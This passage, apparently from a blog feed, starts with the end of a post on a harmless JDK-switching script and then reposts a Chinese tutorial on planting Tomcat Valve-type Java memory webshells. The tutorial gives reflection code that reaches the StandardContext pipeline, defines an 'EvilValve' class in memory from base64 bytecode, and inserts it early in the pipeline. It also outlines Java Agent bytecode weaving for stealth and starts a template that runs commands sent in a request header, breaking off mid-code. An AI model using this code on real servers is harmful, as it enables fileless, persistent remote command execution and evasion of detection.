src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120812589.png" alt="image-20251112081219320"></p><p>点击<code>另存为</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120812372.png" alt="image-20251112081235257"></p><p>一般来说<strong>保存到 JDK 的安装目录</strong>即可，保存类型为 <strong><code>所有文件(*.*)</code></strong> ，编码选择 <strong><code>UTF-8 BOM</code></strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120813936.png" alt="image-20251112081321848"></p><p>最后<strong>保存</strong></p><p>先看一下我当前的 Java 版本吧：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120816302.png" alt="image-20251112081651218"></p><p>以<strong>管理员身份执行 PowerShell</strong>，切换到脚本所在目录</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120818722.png" alt="image-20251112081803639"></p><p>执行**<code>.\switchjdk.ps1</code>** ，就可以看到当前电脑安装的 JDK 版本啦。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120818286.png" alt="image-20251112081848201"></p><p>输入对应的序号进行切换：</p><p>显示已切换，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120819997.png" alt="image-20251112081948912"></p><p>那么我们在另一个终端进行验证：</p><p>可以看到成功切换到我们想要的 JDK 版本了~</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120820736.png" alt="image-20251112082027656"></p>]]></content>
    
    
    <categories>
      
      <category>小工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java内存马——Tomcat Valve型的三种注入</title>
    <link href="/2025/11/08/Java%E5%86%85%E5%AD%98%E9%A9%AC%E2%80%94Tomcat%20Valve%E5%9E%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/11/08/Java%E5%86%85%E5%AD%98%E9%A9%AC%E2%80%94Tomcat%20Valve%E5%9E%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="Java内存马——Tomcat-Valve型的三种注入"><a href="#Java内存马——Tomcat-Valve型的三种注入" class="headerlink" title="Java内存马——Tomcat Valve型的三种注入"></a>Java内存马——Tomcat Valve型的三种注入</h1><p><strong>转载自：</strong><a href="https://www.freebuf.com/articles/web/433972.html"><strong>https://www.freebuf.com/articles/web/433972.html</strong></a></p><h2 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h2><ul><li>**Tomcat Pipeline &amp; Valve：**Tomcat 使用责任链模式处理请求。<code>Pipeline</code>包含多个<code>Valve</code>，每个<code>Valve</code>负责特定任务（如认证、日志、访问控制）。<code>StandardWrapperValve</code>(通常位于链尾) 最终调用 Servlet。</li><li>**<code>StandardContext</code>：**代表一个 Web 应用，持有其对应的<code>Pipeline</code>对象 (<code>StandardContext#getPipeline()</code>)。</li><li>**目标：**将恶意<code>Valve</code>注入到目标 Web 应用<code>StandardContext</code>的<code>Pipeline</code>中，通常是插入在<code>StandardContextValve</code>(负责应用级路由) 和<code>StandardWrapperValve</code>(负责调用 Servlet) 之间，或者尽可能靠前（如紧接在<code>AccessLogValve</code>之后）。恶意 Valve 的<code>invoke()</code>方法检查特定请求特征，匹配则执行命令并截断管道（不再调用<code>getNext().invoke()</code>），直接返回响应。</li></ul><h2 id="注入方式详解"><a href="#注入方式详解" class="headerlink" title="注入方式详解"></a>注入方式详解</h2><h3 id="方式一：纯反射注入（无依赖）"><a href="#方式一：纯反射注入（无依赖）" class="headerlink" title="方式一：纯反射注入（无依赖）"></a>方式一：纯反射注入（无依赖）</h3><ul><li><p><strong>场景：<strong>攻击者已通过漏洞（如反序列化、文件上传 Webshell、其他 RCE）获得代码执行能力，但</strong>当前执行环境没有 Tomcat 的<code>catalina.jar</code>等库依赖</strong>（例如在<code>Bootstrap ClassLoader</code>或<code>Common ClassLoader</code>加载的类中执行）。这是最通用的方式。</p></li><li><p><strong>步骤：</strong></p><ol><li><p><strong>获取当前线程的<code>ContextClassLoader</code>(通常是<code>WebappClassLoader</code>):</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ClassLoader webappClassLoader <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>反射获取<code>ApplicationContext</code>(关键):</strong></p><ul><li>Tomcat 将<code>ApplicationContext</code>存储在<code>WebappClassLoader</code>的<code>resources</code>属性 (<code>org.apache.catalina.webresources.StandardRoot</code>) 的<code>context</code>属性中。</li><li>或者通过<code>ClassLoader</code>的<code>resources</code>属性获取<code>WebResourceRoot</code>，再反射获取其<code>context</code>属性。</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// 通过 WebappClassLoader 获取 resources (StandardRoot)<br>Field resourcesField <span class="hljs-operator">=</span> webappClassLoader.getClass().getDeclaredField(<span class="hljs-string">&quot;resources&quot;</span>)<span class="hljs-comment">;</span><br>resourcesField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardRoot <span class="hljs-operator">=</span> resourcesField.get(webappClassLoader)<span class="hljs-comment">;</span><br>// 通过 StandardRoot 获取 Context (StandardContext)<br>Field contextField <span class="hljs-operator">=</span> standardRoot.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>contextField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardContext <span class="hljs-operator">=</span> contextField.get(standardRoot)<span class="hljs-comment">; // 这就是目标 StandardContext</span><br></code></pre></td></tr></table></figure></li><li><p><strong>反射获取<code>Pipeline</code>对象：</strong></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">Method</span> <span class="hljs-title function_">getPipelineMethod</span> = <span class="hljs-title function_">standardContext</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;getPipeline&quot;)</span>;<br>Object pipeline = getPipelineMethod.invoke(standardContext)<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>反射获取<code>addValve</code>方法：</strong></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">Method</span> <span class="hljs-title function_">addValveMethod</span> = <span class="hljs-title function_">pipeline</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;addValve&quot;, Valve.class)</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>构造恶意 Valve 实例：</strong></p><ul><li>将恶意 Valve 的字节码（编译后的<code>.class</code>文件内容）转换为<code>byte[]</code>(可通过 Class 文件硬编码、远程加载、解码等方式)。</li><li>使用当前<code>WebappClassLoader</code>的<code>defineClass</code>方法（需反射调用）在内存中定义恶意 Valve 类。</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-comment">// 反射调用 protected final defineClass 方法</span><br>Method defineClassMethod = ClassLoader.<span class="hljs-keyword">class</span>.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">byte</span>[].<span class="hljs-keyword">class</span>, <span class="hljs-keyword">int</span>.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">int</span>.<span class="hljs-keyword">class</span>);<br>defineClassMethod.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-keyword">Class</span> evilValveClass = (<span class="hljs-keyword">Class</span>) defineClassMethod.invoke(webappClassLoader, <span class="hljs-string">&quot;com.evil.EvilValve&quot;</span>, evilValveBytecode, <span class="hljs-number">0</span>, evilValveBytecode.length);<br></code></pre></td></tr></table></figure><ul><li>实例化恶意 Valve：</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Valve evilValve <span class="hljs-operator">=</span> (Valve) evilValveClass.newInstance()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>将恶意 Valve 注入 Pipeline：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">addValveMethod.<span class="hljs-built_in">invoke</span>(pipeline, evilValve);<br></code></pre></td></tr></table></figure><ul><li>注入位置控制：Tomcat 的<code>addValve</code>默认加在末尾。要插入特定位置（如开头），需反射获取<code>Pipeline</code>的<code>valves</code>数组 (<code>StandardPipeline#valves</code>)，使用反射修改数组或调用<code>addValve(Valve, int)</code>(如果存在)。</li></ul></li></ol></li><li><p>**优点：**通用性强，不依赖 Tomcat API JAR。</p></li><li><p><strong>缺点：</strong></p><ul><li>代码冗长，大量反射操作。</li><li>需要处理<code>defineClass</code>的调用（<code>protected</code>方法）。</li><li>依赖对 Tomcat 内部结构（<code>WebappClassLoader.resources.context</code>）的准确了解，不同 Tomcat 版本可能有差异。</li><li>注入的 Valve 类由<code>WebappClassLoader</code>加载，在堆内存中可见。</li></ul></li></ul><h3 id="方式二：混合方式（利用-Tomcat-API-反射）"><a href="#方式二：混合方式（利用-Tomcat-API-反射）" class="headerlink" title="方式二：混合方式（利用 Tomcat API &amp; 反射）"></a>方式二：混合方式（利用 Tomcat API &amp; 反射）</h3><ul><li><p><strong>场景：<strong>攻击者获得的代码执行环境</strong>可以访问到 Tomcat 的内部 API</strong>（例如，攻击代码本身是由<code>WebappClassLoader</code>加载的，或者通过某些方式将<code>catalina.jar</code>加入了类路径）。常见于从已存在的 Filter&#x2F;Servlet 型内存马或 JSP Webshell 中进行“二次注入”。</p></li><li><p><strong>步骤：</strong></p><ol><li><p><strong>获取<code>StandardContext</code>(更直接):</strong></p><ul><li>通过<code>ApplicationContext</code>-&gt;<code>ServletContext</code>的属性获取：</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ServletContext servletContext <span class="hljs-operator">=</span> request.getServletContext()<span class="hljs-comment">; // 如果有 request 对象</span><br>Field applicationContextField <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>applicationContextField.setAccessible(true)<span class="hljs-comment">;</span><br>Object applicationContext <span class="hljs-operator">=</span> applicationContextField.get(servletContext)<span class="hljs-comment">;</span><br>Field standardContextField <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>standardContextField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardContext <span class="hljs-operator">=</span> standardContextField.get(applicationContext)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ul><li>或者通过<code>org.apache.catalina.core.ApplicationDispatcher</code>的<code>WRAP_SAME_OBJECT</code>特性（如果启用）获取<code>lastServicedRequest</code>&#x2F;<code>lastServicedResponse</code>中的<code>Context</code>(较复杂)。</li></ul></li><li><p>**获取<code>Pipeline</code>对象：**同方式一。</p></li><li><p><strong>构造恶意 Valve 实例：</strong></p><ul><li>**方式 A (ClassLoader 注入)：**同方式一步骤 5，使用<code>WebappClassLoader.defineClass</code>。</li><li>**方式 B (直接实例化 - 更优)：**如果能直接访问到恶意 Valve 的类定义（例如，恶意 Valve 类字节码已通过其他方式加载，或者攻击代码直接包含了这个类），可以直接<code>new</code>：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Valve</span> <span class="hljs-variable">evilValve</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.evil.EvilValve(); <span class="hljs-comment">// 需要 EvilValve 类在当前 ClassLoader 可见</span><br></code></pre></td></tr></table></figure></li><li><p>**注入 Valve：**直接调用<code>StandardPipeline.addValve()</code>方法：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">((StandardPipeline) pipeline)<span class="hljs-selector-class">.addValve</span>(evilValve);<br></code></pre></td></tr></table></figure><ul><li>同样可以通过反射操作<code>valves</code>数组控制注入位置。</li></ul></li></ol></li><li><p><strong>优点：</strong></p><ul><li>代码相对简洁清晰（减少了反射）。</li><li>效率更高。</li></ul></li><li><p><strong>缺点：</strong></p><ul><li>依赖 Tomcat API 环境（需要<code>org.apache.catalina.*</code>类可见）。</li><li>如果采用方式 B 构造实例，需要解决如何让<code>EvilValve</code>类被加载的问题（可能仍需<code>defineClass</code>或依赖其他已加载的恶意类）。</li></ul></li></ul><h3 id="方式三：Java-Agent-ASM-Javassist-字节码注入（终极隐蔽）"><a href="#方式三：Java-Agent-ASM-Javassist-字节码注入（终极隐蔽）" class="headerlink" title="方式三：Java Agent + ASM&#x2F;Javassist 字节码注入（终极隐蔽）"></a>方式三：Java Agent + ASM&#x2F;Javassist 字节码注入（终极隐蔽）</h3><ul><li><p><strong>场景：<strong>攻击者具备更高权限（如上传 Agent JAR 或利用 Attach API 注入 Agent），追求极致的隐蔽性。目标是</strong>不创建新的 Valve 类</strong>，而是将恶意逻辑<strong>直接编织</strong>进 Tomcat 核心类（如<code>StandardPipeline</code>或某个关键 Valve）的字节码中。</p></li><li><p><strong>步骤：</strong></p><ol><li><p>**注入 Agent：**通过<code>-javaagent</code>启动参数、<code>VirtualMachine.attach()</code>API 或利用已知漏洞加载恶意 Agent Jar。</p></li><li><p>**实现<code>ClassFileTransformer</code>：**在 Agent 中注册自定义的<code>ClassFileTransformer</code>。</p></li><li><p>**定位并修改目标类：**在<code>transform()</code>方法中，识别目标类（例如<code>org.apache.catalina.core.StandardPipeline</code>）：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;org.apache.catalina.core.StandardPipeline&quot;</span>.<span class="hljs-built_in">equals</span>(className)) &#123;<br>    <span class="hljs-comment">// 使用 ASM 或 Javassist 修改字节码</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>修改<code>addValve</code>或<code>invoke</code>逻辑 (策略)：</strong></p><ul><li>**策略 A (劫持<code>invoke</code>):**修改<code>StandardPipeline</code>的<code>invoke()</code>方法。在方法内部遍历<code>valves</code>数组之前或某个关键节点（如调用<code>StandardContextValve.invoke()</code>前），插入恶意逻辑：检查请求特征，匹配则执行命令、构造响应并返回（跳过后续 Valve）。</li><li>**策略 B (伪装成现有 Valve):**修改某个不常用或非关键的现有 Valve 类（如<code>StandardContextValve</code>或<code>AccessLogValve</code>）的<code>invoke()</code>方法。在其原有逻辑的开头或结尾插入恶意检查逻辑。</li><li>**策略 C (创建“幽灵”Valve):**修改<code>StandardPipeline</code>的<code>addValve()</code>方法。使其在特定条件下（例如，添加的 Valve 类名匹配某个特殊模式或 hash）不真正添加该 Valve，而是将其保存到一个隐藏的列表中。同时修改<code>invoke()</code>方法，使其在调用官方<code>valves</code>数组前后，也遍历并调用这个隐藏列表中的“幽灵” Valve。这种方式极其隐蔽，因为常规的<code>Pipeline.valves</code>数组中看不到恶意 Valve。</li></ul></li><li><p>**字节码操作：**使用 ASM&#x2F;Javassist 库插入恶意字节码。恶意逻辑通常包含：</p><ul><li>从<code>Request</code>对象获取参数&#x2F;头&#x2F;路径。</li><li>与预设密码比较。</li><li>调用<code>Runtime.exec()</code>或<code>ProcessBuilder</code>执行命令。</li><li>读取执行结果，写入<code>Response</code>输出流。</li><li>根据是否匹配密码，决定是否继续调用原始管道逻辑 (<code>getNext().invoke()</code>）。</li></ul></li></ol></li><li><p><strong>优点：</strong></p><ul><li>**终极隐蔽性：**没有新的可疑类 (<code>EvilValve</code>) 被定义和加载。恶意逻辑“溶解”在 Tomcat 官方核心类中。</li><li>不依赖<code>WebappClassLoader</code>，应用重启后只要 Agent 仍在就有效（持久化能力强）。</li><li>极难通过常规内存 dump 分析发现（需要逐类反编译校验）。</li></ul></li><li><p><strong>缺点：</strong></p><ul><li>实现难度极高，需要深入理解 JVM 字节码和 Tomcat 内部流程。</li><li>需要获取 Agent 注入的权限（通常意味着已有较高权限）。</li><li>不同 Tomcat 版本的核心类字节码差异较大，需要为不同版本定制或做兼容。</li><li>Agent 本身的存在可能被检测（JVM 参数、<code>VirtualMachine.list()</code>）。</li></ul></li></ul><h2 id="纯反射注入"><a href="#纯反射注入" class="headerlink" title="纯反射注入"></a>纯反射注入</h2><h3 id="一、核心原理与目标"><a href="#一、核心原理与目标" class="headerlink" title="一、核心原理与目标"></a><strong>一、核心原理与目标</strong></h3><ol><li><strong>目标</strong>：在不引入Tomcat API依赖（<code>catalina.jar</code>等）的情况下，通过纯反射操作：<ul><li>获取当前Web应用的<code>StandardContext</code>（Tomcat核心容器对象）</li><li>定位其<code>Pipeline</code>（请求处理管道）</li><li>动态注入恶意<code>Valve</code>实例到管道中</li></ul></li><li><strong>技术挑战</strong>：<ul><li>绕过类加载器隔离（从非Web类加载器访问Web层对象）</li><li>通过反射链破解Tomcat内部数据结构</li><li>内存中定义恶意Valve类（无磁盘文件）</li></ul></li></ol><h3 id="二、注入流程详解"><a href="#二、注入流程详解" class="headerlink" title="二、注入流程详解"></a>二、注入流程详解</h3><h4 id="步骤1：获取WebappClassLoader"><a href="#步骤1：获取WebappClassLoader" class="headerlink" title="步骤1：获取WebappClassLoader"></a><strong>步骤1：获取WebappClassLoader</strong></h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ClassLoader webappClassLoader <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ul><li><strong>原理</strong>：Tomcat为每个Web应用创建独立的<code>WebappClassLoader</code>，当前线程的ClassLoader通常就是它。</li><li><strong>注意</strong>：在非请求线程（如反序列化触发的线程）中需遍历线程组定位。</li></ul><h4 id="步骤2：反射获取StandardContext"><a href="#步骤2：反射获取StandardContext" class="headerlink" title="步骤2：反射获取StandardContext"></a><strong>步骤2：反射获取StandardContext</strong></h4><p>这是最核心的步骤，需穿透两层隐藏引用：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// <span class="hljs-number">1</span>. 获取WebappClassLoader的resources属性(StandardRoot)<br>Field resourcesField <span class="hljs-operator">=</span> webappClassLoader.getClass().getDeclaredField(<span class="hljs-string">&quot;resources&quot;</span>)<span class="hljs-comment">;</span><br>resourcesField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardRoot <span class="hljs-operator">=</span> resourcesField.get(webappClassLoader)<span class="hljs-comment">;</span><br><br>// <span class="hljs-number">2</span>. 获取StandardRoot的context属性(StandardContext)<br>Field contextField <span class="hljs-operator">=</span> standardRoot.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>contextField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardContext <span class="hljs-operator">=</span> contextField.get(standardRoot)<span class="hljs-comment">; // 得到目标StandardContext</span><br></code></pre></td></tr></table></figure><ul><li><strong>关键路径</strong>：<br><code>WebappClassLoader</code>→<code>resources</code>(<code>StandardRoot</code>) →<code>context</code>(<code>StandardContext</code>)</li></ul><h4 id="步骤3：获取Pipeline对象"><a href="#步骤3：获取Pipeline对象" class="headerlink" title="步骤3：获取Pipeline对象"></a><strong>步骤3：获取Pipeline对象</strong></h4><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">Method</span> <span class="hljs-title function_">getPipelineMethod</span> = <span class="hljs-title function_">standardContext</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;getPipeline&quot;)</span>;<br>Object pipeline = getPipelineMethod.invoke(standardContext)<span class="hljs-punctuation">;</span> <span class="hljs-comment">// StandardPipeline实例</span><br></code></pre></td></tr></table></figure><h4 id="步骤4：定义恶意Valve类（内存加载）"><a href="#步骤4：定义恶意Valve类（内存加载）" class="headerlink" title="步骤4：定义恶意Valve类（内存加载）"></a><strong>步骤4：定义恶意Valve类（内存加载）</strong></h4><p><strong>方案A：硬编码字节码（推荐）</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// 1. 预编译EvilValve.class并转为字节数组</span><br><span class="hljs-type">byte</span>[] evilValveBytecode = Base<span class="hljs-number">64.</span><span class="hljs-built_in">decode</span>(<span class="hljs-string">&quot;yv66vgAAADQAKgoABwAUBwAVCAAWCgAB...&quot;</span>);<br><br><span class="hljs-comment">// 2. 反射调用ClassLoader.defineClass</span><br>Method defineClassMethod = ClassLoader.<span class="hljs-keyword">class</span>.<span class="hljs-built_in">getDeclaredMethod</span>(<br>    <span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">String</span>.<span class="hljs-keyword">class</span>, <span class="hljs-type">byte</span>[].<span class="hljs-keyword">class</span>, <span class="hljs-type">int</span>.<span class="hljs-keyword">class</span>, <span class="hljs-type">int</span>.<span class="hljs-keyword">class</span>);<br>defineClassMethod.<span class="hljs-built_in">setAccessible</span>(<span class="hljs-literal">true</span>);<br>Class&lt;?&gt; evilValveClass = (Class&lt;?&gt;) defineClassMethod.<span class="hljs-built_in">invoke</span>(<br>    webappClassLoader, <span class="hljs-string">&quot;com.evil.EvilValve&quot;</span>, evilValveBytecode, <span class="hljs-number">0</span>, evilValveBytecode.length);<br></code></pre></td></tr></table></figure><p><strong>方案B：动态生成字节码（ASM&#x2F;Javassist）</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino">ClassWriter cw = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ClassWriter</span>(<span class="hljs-number">0</span>);<br>cw.<span class="hljs-built_in">visit</span>(Opcodes.V1_8, ACC_PUBLIC, <span class="hljs-string">&quot;com/evil/EvilValve&quot;</span>, null, <span class="hljs-string">&quot;java/lang/Object&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;org/apache/catalina/Valve&quot;</span>&#125;);<br><span class="hljs-comment">// ... 生成invoke()方法字节码 ...</span><br><span class="hljs-type">byte</span>[] evilValveBytecode = cw.<span class="hljs-built_in">toByteArray</span>();<br><span class="hljs-comment">// 后续同方案A的defineClass调用</span><br></code></pre></td></tr></table></figure><h4 id="步骤5：实例化并注入Valve"><a href="#步骤5：实例化并注入Valve" class="headerlink" title="步骤5：实例化并注入Valve"></a><strong>步骤5：实例化并注入Valve</strong></h4><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-comment">// 实例化恶意Valve</span><br><span class="hljs-keyword">Constructor</span>&lt;?&gt; <span class="hljs-title function_">constructor</span> = <span class="hljs-title function_">evilValveClass</span>.<span class="hljs-title function_">getDeclaredConstructor</span><span class="hljs-params">()</span>;<br><span class="hljs-keyword">constructor</span>.setAccessible(<span class="hljs-keyword">true</span>)<span class="hljs-punctuation">;</span><br>Object evilValve = <span class="hljs-keyword">constructor</span>.newInstance()<span class="hljs-punctuation">;</span><br><br><span class="hljs-comment">// 获取Pipeline的addValve方法</span><br><span class="hljs-keyword">Method</span> <span class="hljs-title function_">addValveMethod</span> = <span class="hljs-title function_">pipeline</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;addValve&quot;, Valve.class)</span>;<br>addValveMethod.invoke(pipeline, evilValve)<span class="hljs-punctuation">;</span> <span class="hljs-comment">// 注入到管道末尾</span><br></code></pre></td></tr></table></figure><h4 id="步骤6（可选）：控制注入位置"><a href="#步骤6（可选）：控制注入位置" class="headerlink" title="步骤6（可选）：控制注入位置"></a><strong>步骤6（可选）：控制注入位置</strong></h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// 获取Pipeline的valves数组</span><br>Field valvesField = pipeline.getClass().getDeclaredField(<span class="hljs-string">&quot;valves&quot;</span>);<br>valvesField.setAccessible(<span class="hljs-literal">true</span>);<br>Valve[] valves = (Valve[]) valvesField.get(pipeline);<br><br><span class="hljs-comment">// 创建新数组并将恶意Valve插入第二位（紧接AccessLogValve后）</span><br>Valve[] newValves = <span class="hljs-keyword">new</span> Valve[valves.<span class="hljs-built_in">length</span> + <span class="hljs-number">1</span>];<br>System.arraycopy(valves, <span class="hljs-number">0</span>, newValves, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);    <span class="hljs-comment">// 保留第一个Valve</span><br>newValves[<span class="hljs-number">1</span>] = (Valve) evilValve;                <span class="hljs-comment">// 恶意Valve插入第二位</span><br>System.arraycopy(valves, <span class="hljs-number">1</span>, newValves, <span class="hljs-number">2</span>, valves.<span class="hljs-built_in">length</span> - <span class="hljs-number">1</span>);<br>valvesField.set(pipeline, newValves);<br></code></pre></td></tr></table></figure><ul><li><strong>位置策略</strong>：插入在<code>StandardContextValve</code>之前（通常索引1）确保捕获所有请求。</li></ul><h3 id="三、恶意Valve类实现模板"><a href="#三、恶意Valve类实现模板" class="headerlink" title="三、恶意Valve类实现模板"></a><strong>三、恶意Valve类实现模板</strong></h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilValve</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final <span class="hljs-title class_">String</span> password = <span class="hljs-string">&quot;X-TOKEN&quot;</span>; <span class="hljs-comment">// 激活密码</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">invoke</span>(<span class="hljs-title class_">Request</span> request, <span class="hljs-title class_">Response</span> response) throws <span class="hljs-title class_">IOException</span>, <span class="hljs-title class_">ServletException</span> &#123;<br>        <span class="hljs-comment">// 1. 检查激活密码</span><br>        <span class="hljs-title class_">String</span> cmd = request.<span class="hljs-title function_">getHeader</span>(password);<br>        <span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-title function_">getNext</span>().<span class="hljs-title function_">invoke</span>(request, response); <span class="hljs-comment">// 传递请求</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 2. 执行命令并回显</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title class_">String</span>[] cmds = <span class="hljs-title class_">System</span>.<span class="hljs-title 